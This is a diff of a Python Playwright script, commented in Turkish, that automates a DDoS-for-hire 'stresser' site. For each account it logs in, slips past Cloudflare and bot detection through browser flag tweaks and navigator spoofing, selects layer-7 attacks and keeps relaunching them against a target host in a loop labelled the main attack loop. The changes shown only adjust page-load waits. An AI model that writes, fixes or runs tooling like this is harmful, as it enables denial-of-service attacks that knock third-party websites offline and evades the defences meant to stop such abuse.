@@ -61,7 +61,8 @@ def attack_worker(account):
                         "--disable-dev-shm-usage",
                         "--disable-gpu",
                         "--disable-blink-features=AutomationControlled",
-                        "--disable-features=IsolateOrigins,site-per-process"
+                        "--disable-features=IsolateOrigins,site-per-process",
+                        "--disable-setuid-sandbox"
                     ],
                     slow_mo=250
                 )
@@ -73,21 +74,26 @@ def attack_worker(account):
                     Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                 """)
 
-                # Giriş
+                # ---------- GİRİŞ (DOMContentLoaded kullan, networkidle bekleme) ----------
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/login", timeout=120000, wait_until="networkidle")
+                    # Değişiklik 1: networkidle -> domcontentloaded
+                    page.goto("https://l7srv.su/login", timeout=120000, wait_until="domcontentloaded")
+                    
                     if "cf-browser-verification" in page.url or "challenge" in page.url:
                         print(f"[{username}] ⚡ Cloudflare challenge algılandı, geçilmesi bekleniyor...")
-                        page.wait_for_timeout(10000)
-                        page.reload(wait_until="networkidle")
+                        page.wait_for_timeout(15000)  # 15 saniye bekle
+                        page.reload(wait_until="domcontentloaded")
                         page.wait_for_timeout(5000)
 
+                    # #username gelene kadar bekle
                     page.wait_for_selector("#username", timeout=30000)
                     page.fill("#username", username)
                     page.fill("#password", password)
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                     page.click("#loginNextBtn")
+                    
+                    # Dashboard'a yönlenene kadar bekle
                     page.wait_for_url(lambda url: "/dash" in url, timeout=90000)
                     print(f"[{username}] ✅ Giriş başarılı!")
                     consecutive_errors = 0
@@ -100,10 +106,10 @@ def attack_worker(account):
                     time.sleep(wait_time)
                     continue
 
-                # Stress sayfası
+                # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="networkidle")
+                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="domcontentloaded")
                     page.wait_for_timeout(3000)
                     page.wait_for_selector("#layer_7", timeout=20000)
                     page.locator("#layer_7").click()
@@ -118,7 +124,7 @@ def attack_worker(account):
                     time.sleep(wait_time)
                     continue
 
-                # Ana döngü
+                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                 while True:
                     try:
                         page.wait_for_selector("#l7host", timeout=15000)
@@ -143,7 +149,8 @@ def attack_worker(account):
                                     break
                             time.sleep(2)
 
-                        page.reload(wait_until="networkidle")
+                        # Sayfayı yenile
+                        page.reload(wait_until="domcontentloaded")
                         page.wait_for_timeout(3000)
                         page.wait_for_selector("#layer_7", timeout=15000)
                         page.locator("#layer_7").click()
@@ -152,7 +159,7 @@ def attack_worker(account):
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
                         try:
-                            page.reload(wait_until="networkidle")
+                            page.reload(wait_until="domcontentloaded")
                             page.wait_for_timeout(5000)
                         except:
                             pass
